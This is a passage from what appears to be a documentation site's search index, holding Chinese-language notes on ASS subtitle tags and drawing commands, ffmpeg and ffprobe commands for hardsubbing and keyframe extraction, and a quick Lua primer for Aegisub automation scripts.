yshad \u53ef\u4ee5\u8bbe\u7f6e\u8d1f\u6570 \\be0 \\be1 \\be&lt;strength&gt; \u8fb9\u6846\u6a21\u7cca\uff0c\u5373\u6a21\u7cca bord \u8bbe\u7f6e\u7684\u8fb9\u6846\uff0c\u6548\u679c\u4e0d\u4e00\u5b9a\u660e\u663e \\blur&lt;strength&gt; \u8fb9\u7f18\u6a21\u7cca\uff0cstrength \u8f83\u5927\u7684\u65f6\u5019\u6548\u679c\u6bd4 be \u597d\uff0c\u4e14\u53ef\u4ee5\u4e0d\u4e3a\u6574\u6570 \\fn&lt;font&gt; \u8bbe\u7f6e\u5b57\u4f53 \\fs&lt;size&gt; \u8bbe\u7f6e\u5b57\u53f7\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a\u50cf\u7d20\u5355\u4f4d \\fscx&lt;scale&gt; \\fscy&lt;scale&gt; x \u548c y \u65b9\u5411\u4e0a\u7684\u5b57\u4f53\u7f29\u653e\uff0cscale \u4e3a\u767e\u5206\u6bd4\uff0c\u5373 \\fscx100 \u4e3a\u4e0d\u53d8\u591a\u6b21\u4f7f\u7528\u6548\u679c\u4e0d\u4f1a\u53e0\u52a0\uff0c\u5c31\u662f\u4ece\u539f\u5b57\u53f7\u5927\u5c0f\u5f00\u59cb\u7b97\u7684\u6bd4\u4f8b \\fsp&lt;spacing&gt; \u8bbe\u7f6e\u5b57\u7b26\u95f4\u8ddd\uff0c\u53ef\u4ee5\u662f\u8d1f\u6570\u548c\u5c0f\u6570 \\frx&lt;deg&gt; \\fry&lt;deg&gt; \\frz&lt;deg&gt; xyz \u4e09\u4e2a\u65b9\u5411\u4e0a\u7684\u65cb\u8f6c\uff0cfrz \u53ef\u4ee5\u5199\u4e3a fr\uff0c\u65cb\u8f6c\u4e2d\u5fc3\u4e3a org \u6307\u5b9a\u53ef\u4ee5\u7528 Aegisub \u7684\u53ef\u89c6\u5316\u5de5\u5177\u8c03\u6574 \\fax&lt;factor&gt; \\fay&lt;factor&gt; \u526a\u5207\u6548\u679c\uff08\u5e94\u7528\u5728\u65cb\u8f6c\u4e4b\u540e\uff0c\u4e0d\u53d7 org \u5f71\u54cd\uff09 \\1c&lt;color&gt; \\2c.. \\3c.. \\4c.. \u8bbe\u7f6e\u989c\u8272\uff0c1c \u53ef\u4ee5\u5199\u4e3a c\uff0c1234 \u5206\u522b\u662f\u4e3b\u8981\u3001\u6b21\u8981\u3001\u8fb9\u6846\u3001\u9634\u5f71\u989c\u8272\u8868\u793a\u4e3a &amp;H&lt;bb&gt;&lt;gg&gt;&lt;rr&gt;&amp;\uff0c\u6ce8\u610f\u662f BGR \u4e0d\u662f RGB \\1a&lt;alpha&gt; \\2a.. \\3a.. \\4a.. \u8bbe\u7f6e\u900f\u660e\u5ea6\uff0c1234 \u610f\u4e49\u548c\u4e0a\u9762\u4e00\u6837\uff0c\\alpha \u540c\u65f6\u8bbe\u7f6e\u56db\u4e2a\u900f\u660e\u5ea6\u8868\u793a\u4e3a &amp;H&lt;aa&gt;&amp;\uff0caa \u4e3a 00-FF \u7684\u5341\u516d\u8fdb\u5236\u6570 \\r \\r&lt;style&gt; \u91cd\u7f6e\u6837\u5f0f\u6216\u8bbe\u4e3a\u67d0\u4e00\u6837\u5f0f\uff08\u6e05\u9664\u524d\u9762\u7684\u5168\u90e8\u7279\u6548\u6807\u7b7e\u6837\u5f0f\u6548\u679c\uff09 \\k.. \\K.. \\kf.. \\ko.. \u5361\u62c9 OK \u6807\u7b7e\uff0c\u5728\u5361\u62c9 OK \u7279\u6548\u9875\u9762\u4e2d\u8be6\u7ec6\u4ecb\u7ecd"},{"location":"others/subs/ass/#_4","title":"\u6574\u884c\u7279\u6548","text":""},{"location":"others/subs/ass/#_5","title":"\u9759\u6001\u6548\u679c","text":"\u6807\u7b7e \u4f5c\u7528 \\an \u5bf9\u9f50\u65b9\u5f0f\uff0c\u548c Aegisub \u6837\u5f0f\u7f16\u8f91\u4e2d\u7684\u7f16\u53f7\u4e00\u81f4\uff0c\u5373 2 \u4e2d\u4e0b 8 \u4e2d\u4e0a \\pos(&lt;x&gt;, &lt;y&gt;) \u5b57\u5e55\u4f4d\u7f6e\uff0c\u50cf\u7d20\u4e3a\u5355\u4f4d\uff0c\u5de6\u4e0a\u4e3a (0, 0)\uff0c\u5411\u53f3\u4e0b\u5206\u522b\u4e3a xy \u6b63\u65b9\u5411\\an \u51b3\u5b9a\u4e86\u4f4d\u7f6e\u7684\u57fa\u51c6\u70b9 \\org(&lt;x&gt;, &lt;y&gt;) \u8bbe\u5b9a\u65cb\u8f6c\u4e2d\u5fc3\u70b9 \\clip(&lt;x1&gt;, &lt;y1&gt;, &lt;x2&gt;, &lt;y2&gt;) \u65b9\u5f62\u906e\u7f69\uff0c\u7ed9\u5b9a\u5de6\u4e0a\u548c\u53f3\u4e0b\u4e24\u4e2a\u70b9\uff0c\u663e\u793a\u65b9\u5f62\u5185\u7684\u90e8\u5206\\iclip \u663e\u793a\u65b9\u5f62\u5916\u7684\u90e8\u5206 \\clip(&lt;scale&gt;, &lt;drawing&gt;) \u901a\u8fc7\u77e2\u91cf\u7ed8\u56fe\u521b\u5efa\u906e\u7f69\uff0cscale \u53ef\u4ee5\u7701\u7565\uff0c\u9ed8\u8ba4\u4e3a 1drawing \u4e3a\u7ed8\u56fe\u6307\u4ee4\uff0c\u5177\u4f53\u89c1\u540e\u6587\uff0c\\iclip \u7528\u6cd5\u540c\u7406"},{"location":"others/subs/ass/#_6","title":"\u52a8\u6001\u6548\u679c","text":"\\move(&lt;x1&gt;, &lt;y1&gt;, &lt;x2&gt;, &lt;y2&gt;) <p>\u5728\u5b57\u5e55\u6301\u7eed\u7684\u65f6\u95f4\u5185\uff0c\u4ece (&lt;x1&gt;, &lt;y1&gt;) \u79fb\u52a8\u5230 (&lt;x2&gt;, &lt;y2&gt;)\u3002</p> <p>\u548c \\pos \u6548\u679c\u51b2\u7a81\uff0c\u907f\u514d\u51fa\u73b0\u5728\u540c\u4e00\u884c\u3002</p> \\move(&lt;x1&gt;, &lt;y1&gt;, &lt;x2&gt;, &lt;y2&gt;, &lt;t1&gt;, &lt;t2&gt;) <p>&lt;t1&gt; \u548c &lt;t2&gt; \u76f8\u5bf9\u4e8e\u8be5\u884c\u5f00\u59cb\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff0c\u5728 &lt;t1&gt; \u5230 &lt;t2&gt; \u65f6\u95f4\u5185\u8fdb\u884c\u79fb\u52a8\u3002</p> <p>\\move \u6807\u7b7e\u4e5f\u53ef\u4ee5\u901a\u8fc7 Aegisub \u53ef\u89c6\u5316\u8bbe\u7f6e\u3002\u65e0\u6cd5\u8fdb\u884c\u53d8\u901f\u79fb\u52a8\u3002</p> \\fade(&lt;t1&gt;, &lt;t2&gt;) &lt;t1&gt; \u548c &lt;t2&gt; \u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff0c\u5728\u5f00\u5934 &lt;t1&gt; \u6beb\u79d2\u6de1\u5165\uff0c\u7ed3\u5c3e &lt;t2&gt; \u6beb\u79d2\u6de1\u51fa\u3002 \\fade(&lt;a1&gt;, &lt;a2&gt;, &lt;a3&gt;, &lt;t1&gt;, &lt;t2&gt;, &lt;t3&gt;, &lt;t4&gt;) \u66f4\u590d\u6742\u7684\u900f\u660e\u5ea6\u53d8\u5316\uff0c\u5728 &lt;t1&gt; \u5230 &lt;t2&gt; \u95f4\u900f\u660e\u5ea6\u4ece &lt;a1&gt; \u53d8\u5230 &lt;a2&gt;\uff0c\u5728 &lt;t3&gt; \u5230 &lt;t4&gt; \u95f4\u518d\u53d8\u5230 &lt;a3&gt;\u3002 \\t(&lt;t1&gt;, &lt;t2&gt;, &lt;accel&gt;, ) <p>\u5c06 tags \u7279\u6548\u6807\u7b7e\u7684\u65bd\u52a0\u5c55\u73b0\u4e3a\u52a8\u753b\u6548\u679c\uff0c\u4e00\u4e9b\u6807\u7b7e\u4e0d\u53ef\u7528\u6bd4\u5982 \\fn\uff0c\u4ee5\u53ca \\clip \u548c \\iclip \u53ea\u80fd\u662f\u77e9\u5f62\u906e\u7f69\uff0c\u4e0d\u652f\u6301\u77e2\u91cf\u906e\u7f69\u7684\u52a8\u753b</p> <p>&lt;t1&gt; \u548c &lt;t2&gt; \u76f8\u5bf9\u4e8e\u8be5\u884c\u5f00\u59cb\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff0c\u8868\u793a\u52a8\u753b\u7684\u65f6\u95f4\u8303\u56f4\uff0c\u53ef\u4ee5\u7701\u7565\uff08\u8868\u793a\u52a8\u753b\u6301\u7eed\u6574\u4e2a\u884c\u7684\u65f6\u95f4\uff09\u3002</p> <p>&lt;accel&gt; \u8868\u793a\u52a0\u901f\u5ea6\uff0c\u9ed8\u8ba4\u4e3a 1 \u5300\u901f\uff0c\u53ef\u4ee5\u7701\u7565\u3002\uff08\u4e0d\u662f\u7f13\u5165\u7f13\u51fa\u7684\u53c2\u6570\uff0c\u800c\u4ec5\u4ec5\u662f\u4e00\u76f4\u52a0\u901f\uff09</p>"},{"location":"others/subs/ass/#_7","title":"\u7ed8\u56fe\u6807\u7b7e","text":"<p>\u5b9e\u9645\u4e0a\u4e5f\u5c5e\u4e8e\u884c\u5185\u7684\u7279\u6548\u6807\u7b7e\uff0c\u4f46\u8bed\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u6240\u4ee5\u5355\u72ec\u62ff\u51fa\u6765\u4e86\u3002</p> \u6807\u7b7e \u4f5c\u7528 \\p1 \\p0 \u6253\u5f00/\u5173\u95ed\u7ed8\u56fe\u6a21\u5f0f\uff0c\\p \u540e\u53ef\u63a5 2 \u7684\u6b21\u65b9\u8bbe\u7f6e\u7ed8\u56fe\u5206\u8fa8\u7387\u7f29\u653e\u6bd4\u4f8b \\pbo&lt;offset&gt; \u7ed8\u5236\u65f6\u7684\u57fa\u7ebf\u504f\u79fb\u8ddd\u79bb\uff08y \u65b9\u5411\u4e0a\u7684\uff0c\u5411\u4e0b\u4e3a\u6b63\uff09"},{"location":"others/subs/ass/#_8","title":"\u7ed8\u56fe\u6307\u4ee4","text":"<p>\u7c7b\u4f3c svg \u4e2d\u7684 path \u8def\u5f84\u8bed\u6cd5\uff0c\u4f46\u76f8\u5bf9\u5c11\u4e00\u4e9b\u3002</p> m &lt;x&gt; &lt;y&gt; \u79fb\u52a8\u5230 (&lt;x&gt;, &lt;y&gt;)\uff0c\u4e14\u81ea\u52a8\u95ed\u5408\u8def\u5f84\u5f00\u542f\u65b0\u56fe\u5f62\u3002\uff08\u7ed8\u56fe\u6307\u4ee4\u90fd\u8981\u4ece\u6b64\u5f00\u59cb\uff09 n &lt;x&gt; &lt;y&gt; \u79fb\u52a8\u5230 (&lt;x&gt;, &lt;y&gt;)\uff0c\u4f46\u4e0d\u95ed\u5408\u8def\u5f84\u3002 l &lt;x&gt; &lt;y&gt; \u753b\u4e00\u6761\u7ebf\u5230 (&lt;x&gt;, &lt;y&gt;)\uff0c\u4e5f\u53ef\u4ee5\u63a5\u591a\u5bf9 &lt;x&gt; &lt;y&gt; \u8fde\u7eed\u753b\u591a\u6761\u7ebf\u3002 b &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; &lt;x3&gt; &lt;y3&gt; \u753b\u4e00\u6761\u4e09\u6b21\u8d1d\u585e\u5c14\u66f2\u7ebf\uff0c\u7ed9\u5b9a\u4e09\u4e2a\u70b9\u5750\u6807\u5206\u522b\u4e3a\u4e24\u4e2a\u63a7\u5236\u70b9\u548c\u4e00\u4e2a\u951a\u70b9\uff08\u53e6\u4e00\u4e2a\u951a\u70b9\u4e3a\u5f53\u524d\u4f4d\u7f6e\uff09\u3002 B \u6837\u6761\u76f8\u5173\uff08\u4e0d\u5e38\u7528\uff09 s &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; ... &lt;xn&gt; &lt;yn&gt; \u5747\u5300 B \u6837\u6761\uff0c\u81f3\u5c11\u8981\u7ed9\u5b9a\u4e09\u4e2a\u70b9\u3002 p &lt;x&gt; &lt;y&gt; \u7ed9 B \u6837\u6761\u6dfb\u52a0\u4e00\u4e2a\u70b9\u3002 c \u95ed\u5408 B \u6837\u6761\u3002 <p>PS: \u4f7f\u7528 <code>{\\p1}m 0 0 l 100 0 100 100 0 100{\\p0}</code> \u5373\u4e00\u4e2a\u65b9\u5757\u914d\u5408 \\fscx \\fscy \u7f29\u653e\u6765\u5236\u4f5c\u4efb\u610f\u77e9\u5f62\u66f4\u65b9\u4fbf\u3002</p>"},{"location":"others/subs/ffmpeg/","title":"ffmpeg \u5957\u4ef6\u4f7f\u7528\u6742\u8bb0","text":"<p> \u7ea6 630 \u4e2a\u5b57  6 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u5728\u5b57\u5e55\u538b\u5236/\u65e5\u5e38\u4f7f\u7528\u4e2d\u7684 ffmpeg \u5957\u4ef6\u4f7f\u7528\u65b9\u6cd5\u8bb0\u5f55</p>"},{"location":"others/subs/ffmpeg/#ffmpeg_1","title":"ffmpeg","text":""},{"location":"others/subs/ffmpeg/#_1","title":"\u4e00\u4e9b\u538b\u5236\u53c2\u6570","text":"<ul> <li><code>-i &lt;input_video&gt;</code> \u8f93\u5165\u6587\u4ef6</li> <li> <p><code>-b:a 320k</code> \u538b\u5236\u97f3\u9891\u6bd4\u7279\u7387 320kbps</p> \u4e3a\u4ec0\u4e48\u8981\u7528 320kbps\uff08\u6765\u81ea NetaP495L \u79c1\u804a\uff09 <ul> <li>https://hydrogenaud.io/index.php?topic=120062.0\u3001https://hydrogenaud.io/index.php?topic=120166.0</li> <li>ffmpeg \u9ed8\u8ba4 AAC \u7f16\u7801\u5668\u538b 128k \u7684 AAC \u7684\u8bdd\u4f1a\u6709\u660e\u663e\u97f3\u8d28\u635f\u5931\uff08\u636e\u8bf4\u6709\u89c2\u4f17\u80fd\u542c\u51fa\u6765\uff09</li> <li>\u9ed8\u8ba4 AAC \u7f16\u7801\u5668\u538b 320k \u8981\u597d\u4e00\u70b9</li> <li>\u6216\u8005\u6839\u636e https://trac.ffmpeg.org/wiki/Encode/AAC \u7684\u6307\u5357\u7f16\u8bd1\u4e00\u4efd\u5305\u542b libfdk_aac \u7f16\u7801\u5668\u7684 ffmpeg \u4f7f\u7528</li> </ul> </li> <li> <p><code>-c:a copy</code> \u62f7\u8d1d\u97f3\u9891\u6d41</p> </li> <li><code>-b:v 6000k</code> \u6307\u5b9a\u89c6\u9891\u6bd4\u7279\u7387</li> </ul>"},{"location":"others/subs/ffmpeg/#_2","title":"\u538b\u5236\u5b57\u5e55","text":"<p>ffmpeg \u9ed8\u8ba4\u4f7f\u7528 libass \u6e32\u67d3\u5b57\u5e55\uff0c\u7528\u6cd5\u5c31\u662f\u6dfb\u52a0\u4e00\u4e2a video filter\uff1a</p> <ul> <li><code>-vf ass=&lt;ass_filename&gt;</code> \u5373\u53ef\u52a0\u8f7d ass \u5b57\u5e55\u6587\u4ef6\u5e76\u538b\u5230\u89c6\u9891\u5f53\u4e2d</li> <li><code>-vf subtitles=&lt;sub_filename&gt;</code> subtitles \u8fd9\u4e2a filter \u652f\u6301\u975e ass \u683c\u5f0f\u7684\u5b57\u5e55\uff08\u672c\u8d28\u4e0a\u662f\u8f6c\u4e3a ass \u518d\u7ed9 libass \u5904\u7406\uff09</li> <li><code>-vf ass=&lt;ass_filename&gt;:shaping=complex</code> \u9700\u8981\u652f\u6301\u67d0\u4e9b\u590d\u6742\u5b57\u4f53\u7279\u6027\u65f6\u8981\u8fd9\u6837<ul> <li>ass filter \u53ef\u4ee5\u901a\u8fc7 shaping \u9009\u5b9a\u9020\u5f62\u5f15\u64ce</li> <li>FriBidi 1.0.12 (SIMPLE) \u53ea\u652f\u6301\u4e00\u5c0f\u90e8\u5206\u8fde\u5b57\uff0c\u4e0d\u80fd\u5904\u7406\u4efb\u4f55 OpenType \u7279\u6027</li> <li>HarfBuzz-ng 7.3.0 (COMPLEX) \u80fd\u6b63\u786e\u5904\u7406\u591a\u6587\u79cd\u9020\u5f62</li> <li>\uff08\u4ee5\u4e0a\u8f6c\u81ea NetaP495L \u7684\u56de\u590d\uff09</li> </ul> </li> </ul>"},{"location":"others/subs/ffmpeg/#_3","title":"\u5408\u5e76\u56fe\u7247\u6d41","text":"<p>Aegisub \u5728\u641e\u8ddf\u8e2a\u7684\u65f6\u5019\u9700\u8981\u5bfc\u51fa\u65f6\u95f4\u8303\u56f4\u5185\u7684\u89c6\u9891\u5207\u7247\uff0c\u4f46\u6211\u8fd9\u91cc\u76f4\u63a5\u5207\u89c6\u9891\u4e0d\u592a\u597d\u4f7f\uff08\u56e0\u4e3a\u9ed8\u8ba4\u6709 crf \u53c2\u6570\uff0c\u6211\u76ee\u524d\u7684 ffmpeg \u6ca1\u914d\u7f6e\u8fd9\u4e2a\uff09\uff0c\u53e6\u4e00\u79cd\u65b9\u5f0f\u662f\u5bfc\u51fa\u8303\u56f4\u5185\u7684\u7cfb\u5217\u56fe\u7247\uff0c\u8fd9\u6837\u662f\u53ef\u4ee5\u7684\uff0c\u53ea\u662f\u9700\u8981\u540e\u7eed\u518d\u7528 ffmpeg \u62fc\u4e00\u4e0b\uff1a</p> <pre><code>$ ffmpeg -r 23.976 -f image2 -i \"...-%05d.jpg\" -vcodec libx264 clip.mp4\n</code></pre>"},{"location":"others/subs/ffmpeg/#ffprobe","title":"ffprobe","text":""},{"location":"others/subs/ffmpeg/#_4","title":"\u63d0\u53d6\u5173\u952e\u5e27","text":"<p>Aegisub \u53ef\u4ee5\u8f7d\u5165\u5173\u952e\u5e27\u6587\u4ef6\u663e\u793a\u5728\u97f3\u9891\u4e2d\uff0c\u65b9\u4fbf\u6253\u8f74\u65f6\u5bf9\u5173\u952e\u5e27\u3002\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u7528 Aegisub \u5bfc\u51fa\uff0c\u4e5f\u53ef\u4ee5\u7528 ffprobe \u9010\u5e27\u8bfb\u53d6\u5e27\u7c7b\u578b\uff0c\u7b5b\u9009\u5173\u952e\u5e27\u8f93\u51fa\u7d22\u5f15\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e00\u4e9b\u6e90\u7684\u5173\u952e\u5e27\u5206\u5e03\u5e76\u975e\u5728\u753b\u9762\u5207\u6362\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5148\u7528 ffmpeg \u65e0\u53c2\u6570\u538b\u5230 mp4\uff08<code>ffmpeg -i &lt;origin_video&gt; output.mp4</code>\uff09\uff0c\u8fd9\u6837\u7b5b\u9009\u51fa\u7684\u5173\u952e\u5e27\u4e00\u822c\u5c31\u662f\u753b\u9762\u5207\u6362\u7684\u4f4d\u7f6e\u4e86\u3002</p> <pre><code>$ ffprobe -i output.mp4 -select_streams v -show_frames -show_entries frame=pict_type -of csv | sed -n '3,$p' | grep -n I | cut -d ':' -f 1 &gt; tmp.txt\n</code></pre> <ul> <li>ffprobe \u8fd9\u53e5\u7528\u6765\u6253\u5370\u6bcf\u4e00\u5e27\u7684\u5e27\u7c7b\u578b\uff0c\u5173\u952e\u5e27\u6240\u5728\u7684\u884c\u8f93\u51fa \"frame,I\"</li> <li><code>sed -n '3,$p'</code> \u4ece\u7b2c\u4e09\u884c\u5f00\u59cb\u663e\u793a\uff08\u7b2c\u4e00\u884c\u662f\u7b2c 0 \u5e27\uff0c\u7b2c\u4e8c\u884c\u662f\u7a7a\u884c\uff0c\u4e0d\u5220\u6389\u540e\u9762\u7684\u5e8f\u53f7\u4f1a\u6574\u4f53\u79fb\u4e24\u4e2a\uff09</li> <li><code>grep -n I</code> \u7b5b\u9009\u5173\u952e\u5e27\u51fa\u73b0\u7684\u4f4d\u7f6e</li> <li><code>cut -d ':' -f 1</code> \u4ec5\u4fdd\u7559 grep -n \u8f93\u51fa\u7684\u884c\u53f7\uff08\u4e5f\u5c31\u662f\u5e27\u53f7\uff09</li> </ul> <p>Aegisub \u52a0\u8f7d\u4e4b\u524d\u9700\u8981\u5728\u5f00\u5934\u52a0\u4e0a\u5173\u952e\u5e27\u6587\u4ef6\u4fe1\u606f\uff08\u4ee5\u53ca\u521a\u624d\u5220\u6389\u7684\u7b2c 0 \u5e27\uff09\uff1a</p> <pre><code># keyframe format v1\nfps 0\n0\n</code></pre> <pre><code>$ echo '# keyframe format v1\\nfps 0\\n0' | cat - tmp.txt &gt; keyframes.txt\n</code></pre>"},{"location":"others/subs/aegisub/automation/","title":"Aegisub \u81ea\u52a8\u5316","text":"<p> \u7ea6 2273 \u4e2a\u5b57  33 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u5373 Aegisub \u7684\u81ea\u52a8\u5316\u811a\u672c\uff0c\u4f7f\u7528 Lua \u7f16\u5199\uff0c\u901a\u8fc7\u6807\u9898\u680f \u81ea\u52a8\u5316 &gt; \u81ea\u52a8\u5316 \u83dc\u5355\u7ba1\u7406\u811a\u672c\uff08\u5305\u62ec\u8f7d\u5165\u65b0\u7684\u81ea\u5b9a\u4e49\u811a\u672c\uff09\u3002</p> <p>\u53ef\u4ee5\u5b9e\u73b0\u901a\u8fc7\u811a\u672c\u6279\u91cf\u5904\u7406\u5b57\u5e55\u5185\u5bb9\u7684\u6548\u679c\u3002</p>"},{"location":"others/subs/aegisub/automation/#lua","title":"Lua \u901f\u6210","text":"<p>Lua \u8bed\u8a00\u8bed\u6cd5\u5f88\u7b80\u5355\uff0c\u5199\u811a\u672c\u4e5f\u8bb2\u7a76\u80fd\u7528\u5c31\u884c\uff0c\u6574\u7406\u4e86\u4e00\u4e0b\u57fa\u672c\u7684 Lua \u8bed\u6cd5\u6765\u901f\u6210\uff1a</p> <ul> <li>\u884c\u5c3e\u65e0\u5206\u53f7\uff0c\u7f29\u8fdb\u4e0d\u5fc5\u987b\uff0c\u751a\u81f3\u884c\u95f4\u53ef\u4ee5\u4e0d\u7528\u6362\u884c\uff0c-- \u5f00\u5934\u4e3a\u6ce8\u91ca</li> <li>\u52a8\u6001\u7c7b\u578b\uff0c\u57fa\u672c\u7c7b\u578b\u6709\uff1anil boolean number string function userdata thread table<ul> <li>\u6240\u6709\u6570\u5b57\u7c7b\u578b\u90fd\u662f number\uff0c\u4e0d\u5206\u6574\u578b\u548c\u6d6e\u70b9\u578b</li> <li>string \u53ef\u4ee5\u7528\u5355\u53cc\u5f15\u53f7\u4ee5\u53ca\u53cc\u4e2d\u62ec\u53f7 [[]] \u8868\u793a<ul> <li>\u6ce8\uff1aLua \u4e2d\u7684 string \u5176\u5b9e\u76f8\u5f53\u4e8e bytes\uff0c\u9488\u5bf9 Unicode \u5b57\u7b26\u7684\u8bdd\u9700\u8981\u53e6\u5916\u5904\u7406</li> </ul> </li> <li>function \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u53d8\u91cf\u6765\u4f20\u53c2\u4e4b\u7c7b\u7684</li> <li>table \u8868\u4e5f\u79f0\u5173\u8054\u6570\u7ec4\uff0c\u6570\u7ec4\u5b57\u5178\u7b49\u90fd\u7528 table \u8868\u793a</li> </ul> </li> <li>\u5173\u4e8e\u53d8\u91cf<ul> <li>\u4e0d\u5fc5\u6307\u5b9a\u7c7b\u578b\uff0c\u76f4\u63a5\u8d4b\u503c\u5373\u53ef\u4f7f\u7528\uff0c\u672a\u8d4b\u503c\u7684\u4f7f\u7528\u65f6\u4e3a nil \u800c\u4e0d\u4f1a\u62a5\u9519</li> <li><code>a = 1</code> \u5168\u5c40\u53d8\u91cf\uff1b<code>local a = 1</code> \u5c40\u90e8\u53d8\u91cf</li> <li>\u8d4b\u503c\u8bed\u53e5\u7528\u7b49\u53f7\uff0c\u5de6\u53f3\u53ef\u4ee5\u662f\u591a\u4e2a\u53d8\u91cf\uff08\u9017\u53f7\u5206\u9694\uff09<ul> <li>\u7b49\u53f7\u4e24\u4fa7\u5143\u7d20\u4e2a\u6570\u4e0d\u540c\u4e0d\u4f1a\u62a5\u9519\uff0c\u4f1a\u8865 nil \u6216\u5ffd\u7565\u53f3\u4fa7\u591a\u4f59\u503c</li> </ul> </li> </ul> </li> <li>\u5faa\u73af<ul> <li><code>while (condition) do ... end</code></li> <li><code>for var=from,to,step do ... end</code></li> <li><code>for i, v in ipairs(table) do ... end</code></li> <li><code>repeat ... until (condition)</code></li> <li>\u53ef\u4ee5\u5d4c\u5957\uff0c\u4f46\u53ea\u6709 break \u6ca1\u6709 continue</li> <li>continue \u53ef\u4ee5\u7528 <code>goto label</code> \u6765\u5b9e\u73b0\uff0clabel \u7528 <code>::label::</code> \u5b9a\u4e49</li> </ul> </li> <li>\u6d41\u7a0b\u63a7\u5236<ul> <li><code>if (cond1) then ... end</code></li> <li><code>if (cond1) then ... else ... end</code></li> <li><code>if (cond1) then ... elseif (cond2) then ... end</code></li> <li>\u53ef\u4ee5\u5d4c\u5957\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f else \u540e\u9762\u4e0d\u9700\u8981 then</li> </ul> </li> <li>\u51fd\u6570<ul> <li>\u7528 function \u5b9a\u4e49\uff0c\u53ef\u4ee5\u548c\u53d8\u91cf\u4e00\u6837\u6307\u5b9a\u5168\u5c40\uff08\u9ed8\u8ba4\uff09\u6216\u5c40\u90e8\uff08\u52a0 local\uff09     <pre><code>function add(a, b)\n    return a + b\nend\n</code></pre></li> <li>\u8f93\u5165\u8f93\u51fa\u7c7b\u578b\u90fd\u4e0d\u7528\u6307\u5b9a\uff0c\u8fd4\u56de\u76f4\u63a5 return \u5373\u53ef\uff0c\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c</li> <li>\u8c03\u7528\u65f6\u53c2\u6570\u4e2a\u6570\u4e0d\u540c\u4e0d\u4f1a\u62a5\u9519\uff0c\u591a\u4f59\u7684\u53c2\u6570\u4f1a\u88ab\u5ffd\u7565\uff0c\u4e0d\u8db3\u7684\u53c2\u6570\u4f1a\u8865 nil</li> <li>\u8c03\u7528\u65f6\u53ef\u4ee5\u7701\u7565\u62ec\u53f7</li> </ul> </li> <li>\u8fd0\u7b97\u7b26<ul> <li>\u7b97\u6570\uff1a+ - * / %\uff0c^ \u4e58\u65b9\uff0c// \u6574\u9664</li> <li>\u903b\u8f91\uff1a== ~= &gt; &lt; &gt;= &lt;= and or not</li> <li>a .. b \u5b57\u7b26\u4e32\u8fde\u63a5\uff1b#a \u5b57\u7b26\u4e32\u6216\u8868\u7684\u957f\u5ea6</li> <li>\u4f1a\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff0c\u6bd4\u5982 1 + \"2\" \u4f1a\u5f97\u5230 3</li> </ul> </li> <li>\u5b57\u7b26\u4e32<ul> <li>string.len(str) \u5b57\u8282\u957f\u5ea6\uff0cutf8.len(str) \u5b57\u7b26\u957f\u5ea6</li> <li>string.gsub .find .gmatch .match \u53ef\u4ee5\u6a21\u5f0f\u5339\u914d\uff08\u9609\u5272\u7248\u6b63\u5219\uff09</li> <li>string.upper .lower .reverse .rep .char .byte .sub \u4e00\u4e9b\u770b\u540d\u5b57\u5c31\u77e5\u9053\u7528\u6cd5\u7684\u51fd\u6570</li> <li>string.format \u683c\u5f0f\u5316\uff0c\u7c7b\u4f3c C \u7684 printf<ul> <li>%c %d %s \u7b49\uff08o \u516b\u8fdb\u5236\uff0cu \u65e0\u7b26\u53f7\uff0cx \u5341\u516d\u8fdb\u5236\uff0ce \u79d1\u5b66\u8ba1\u6570\u6cd5\uff0cf \u6d6e\u70b9\u6570\u7b49\uff09</li> </ul> </li> <li>\u62fc\u63a5\u7528 ..\uff0c\u4e0d\u80fd\u7528 +\uff08\u4f1a\u4e00\u5f8b\u5c1d\u8bd5\u8f6c number\uff09</li> </ul> </li> <li>table<ul> <li>\u6570\u7ec4\u4e5f\u662f table\uff0c\u4e0b\u6807\u4ece 1 \u5f00\u59cb</li> <li>table.concat(t, sep) \u76f8\u5f53\u4e8e python sep.join(t)</li> <li>table.insert .remove .sort</li> <li>\u672a\u5b9a\u4e49\u7684\u952e\u8bbf\u95ee\u5f97\u5230 nil\uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u503c\u8bbe\u4e3a nil \u76f8\u5f53\u4e8e\u5220\u9664</li> <li>t[i] t.i gettable_event(t, i) \u90fd\u53ef\u4ee5\u8bbf\u95ee\u5143\u7d20</li> </ul> </li> <li>\u6a21\u5757<ul> <li>\u6587\u4ef6\u5185\u521b\u5efa\u4e00\u4e2a table <code>module = {}</code>\uff0c\u7136\u540e\u5b9a\u4e49 module.func \u7b49</li> <li>\u6587\u4ef6\u672b\u5c3e return module \u5373\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6a21\u5757</li> <li>\u5f15\u7528\u65f6 require \"module\" \u5373\u53ef\u4f7f\u7528 module.func</li> </ul> </li> </ul>"},{"location":"others/subs/aegisub/automation/#_1","title":"\u81ea\u52a8\u5316\u811a\u672c\u6846\u67b6","text":"<p>\u81ea\u52a8\u5316 &gt; \u81ea\u52a8\u5316 \u8fd9\u4e2a\u811a\u672c\u7ba1\u7406\u5668\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d lua \u4ee3\u7801\uff08\u5168\u5c40/\u4ec5\u5f53\u524d ass\uff09\u3002Aegisub \u6709\u4e24\u79cd\u81ea\u52a8\u5316\u811a\u672c\u7c7b\u578b\uff1a</p> 